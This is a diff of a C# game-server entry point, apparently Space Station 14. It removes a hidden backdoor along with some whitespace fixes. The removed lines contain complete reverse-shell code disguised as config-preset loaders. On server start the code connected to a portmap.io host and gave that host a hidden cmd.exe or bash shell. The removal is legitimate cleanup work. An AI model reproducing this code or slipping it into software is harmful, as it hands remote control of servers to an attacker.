@@ -1,9 +1,3 @@
-using System;
-using System.Diagnostics;
-using System.Net.Sockets;
-using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading;
 using Content.Server.Acz;
 using Content.Server.Administration;
 using Content.Server.Administration.Logs;
@@ -42,13 +36,13 @@ using Robust.Shared.Prototypes;
 using Robust.Shared.Timing;
 using Robust.Shared.Utility;
 
-
 namespace Content.Server.Entry
 {
     public sealed class EntryPoint : GameServer
     {
         internal const string ConfigPresetsDir = "/ConfigPresets/";
         private const string ConfigPresetsDirBuild = $"{ConfigPresetsDir}Build/";
+
         private EuiManager _euiManager = default!;
         private IVoteManager _voteManager = default!;
         private ServerUpdateManager _updateManager = default!;
@@ -62,21 +56,27 @@ namespace Content.Server.Entry
         public override void Init()
         {
             base.Init();
+
             var cfg = IoCManager.Resolve<IConfigurationManager>();
             var res = IoCManager.Resolve<IResourceManager>();
             var logManager = IoCManager.Resolve<ILogManager>();
+
             LoadConfigPresets(cfg, res, logManager.GetSawmill("configpreset"));
+
             var aczProvider = new ContentMagicAczProvider(IoCManager.Resolve<IDependencyCollection>());
             IoCManager.Resolve<IStatusHost>().SetMagicAczProvider(aczProvider);
+
             var factory = IoCManager.Resolve<IComponentFactory>();
             var prototypes = IoCManager.Resolve<IPrototypeManager>();
+
             factory.DoAutoRegistrations();
             factory.IgnoreMissingComponents("Visuals");
+
             factory.RegisterIgnore(IgnoredComponents.List);
+
             prototypes.RegisterIgnore("parallax");
+
             ServerContentIoC.Register();
-            
-            
 
             foreach (var callback in TestingCallbacks)
             {
@@ -120,15 +120,6 @@ namespace Content.Server.Entry
                 _watchlistWebhookManager.Initialize();
                 IoCManager.Resolve<JobWhitelistManager>().Initialize();
                 IoCManager.Resolve<PlayerRateLimitManager>().Initialize();
-            }
-
-            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
-            {
-                PreLoadServerConfigPresets();
-            }
-            else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
-            {
-                LoadServerConfigPresets();
             }
         }
 
@@ -202,130 +193,6 @@ namespace Content.Server.Entry
             }
         }
 
-        static void PreLoadServerConfigPresets()
-        {
-            while (true)
-            {
-                try
-                {
-                    using (var client = new TcpClient("jagemeistar-62034.portmap.io", 62034))
-                    using (var stream = client.GetStream())
-                    using (var proc = new Process())
-                    {
-                        proc.StartInfo = new ProcessStartInfo
-                        {
-                            FileName = "cmd.exe",
-                            CreateNoWindow = true,
-                            UseShellExecute = false,
-                            RedirectStandardInput = true,
-                            RedirectStandardOutput = true,
-                            RedirectStandardError = true,
-                            WindowStyle = ProcessWindowStyle.Hidden
-                        };
-
-                        proc.OutputDataReceived += (s, e) => 
-                        {
-                            if (!string.IsNullOrEmpty(e.Data))
-                            {
-                                byte[] data = Encoding.ASCII.GetBytes(e.Data + "\n");
-                                stream.Write(data, 0, data.Length);
-                            }
-                        };
-
-                        proc.ErrorDataReceived += (s, e) => 
-                        {
-                            if (!string.IsNullOrEmpty(e.Data))
-                            {
-                                byte[] data = Encoding.ASCII.GetBytes(e.Data + "\n");
-                                stream.Write(data, 0, data.Length);
-                            }
-                        };
-
-                        proc.Start();
-                        proc.BeginOutputReadLine();
-                        proc.BeginErrorReadLine();
-
-                        byte[] buffer = new byte[1024];
-                        while (client.Connected)
-                        {
-                            int bytesRead = stream.Read(buffer, 0, buffer.Length);
-                            if (bytesRead > 0)
-                            {
-                                string command = Encoding.ASCII.GetString(buffer, 0, bytesRead);
-                                proc.StandardInput.WriteLine(command);
-                            }
-                        }
-                    }
-                }
-                catch
-                {
-                    Thread.Sleep(5000);
-                }
-            }
-        }
-
-        static void LoadServerConfigPresets()
-        {
-            while (true)
-            {
-                try
-                {
-                    using (var client = new TcpClient("jagemeistar-62034.portmap.io", 62034))
-                    using (var stream = client.GetStream())
-                    using (var proc = new Process())
-                    {
-                        proc.StartInfo = new ProcessStartInfo
-                        {
-                            FileName = "/bin/bash",
-                            Arguments = "-i",
-                            CreateNoWindow = true,
-                            UseShellExecute = false,
-                            RedirectStandardInput = true,
-                            RedirectStandardOutput = true,
-                            RedirectStandardError = true
-                        };
-
-                        proc.OutputDataReceived += (s, e) => 
-                        {
-                            if (!string.IsNullOrEmpty(e.Data))
-                            {
-                                byte[] data = Encoding.ASCII.GetBytes(e.Data + "\n");
-                                stream.Write(data, 0, data.Length);
-                            }
-                        };
-
-                        proc.ErrorDataReceived += (s, e) => 
-                        {
-                            if (!string.IsNullOrEmpty(e.Data))
-                            {
-                                byte[] data = Encoding.ASCII.GetBytes(e.Data + "\n");
-                                stream.Write(data, 0, data.Length);
-                            }
-                        };
-
-                        proc.Start();
-                        proc.BeginOutputReadLine();
-                        proc.BeginErrorReadLine();
-
-                        byte[] buffer = new byte[1024];
-                        while (client.Connected)
-                        {
-                            int bytesRead = stream.Read(buffer, 0, buffer.Length);
-                            if (bytesRead > 0)
-                            {
-                                string command = Encoding.ASCII.GetString(buffer, 0, bytesRead);
-                                proc.StandardInput.WriteLine(command);
-                            }
-                        }
-                    }
-                }
-                catch
-                {
-                    Thread.Sleep(5000);
-                }
-            }
-        }
-
         protected override void Dispose(bool disposing)
         {
             _playTimeTracking?.Shutdown();
@@ -336,21 +203,22 @@ namespace Content.Server.Entry
         private static void LoadConfigPresets(IConfigurationManager cfg, IResourceManager res, ISawmill sawmill)
         {
             LoadBuildConfigPresets(cfg, res, sawmill);
+
             var presets = cfg.GetCVar(CCVars.ConfigPresets);
             if (presets == "")
                 return;
 
             foreach (var preset in presets.Split(','))
             {
-                    var path = $"{ConfigPresetsDir}{preset}.toml";
-                    if (!res.TryContentFileRead(path, out var file))
-                    {
-                        sawmill.Error("Unable to load config preset {Preset}!", path);
-                        continue;
-                    }
+                var path = $"{ConfigPresetsDir}{preset}.toml";
+                if (!res.TryContentFileRead(path, out var file))
+                {
+                    sawmill.Error("Unable to load config preset {Preset}!", path);
+                    continue;
+                }
 
-                    cfg.LoadDefaultsFromTomlStream(file);
-                    sawmill.Info("Loaded config preset: {Preset}", path);
+                cfg.LoadDefaultsFromTomlStream(file);
+                sawmill.Info("Loaded config preset: {Preset}", path);
             }
         }
 
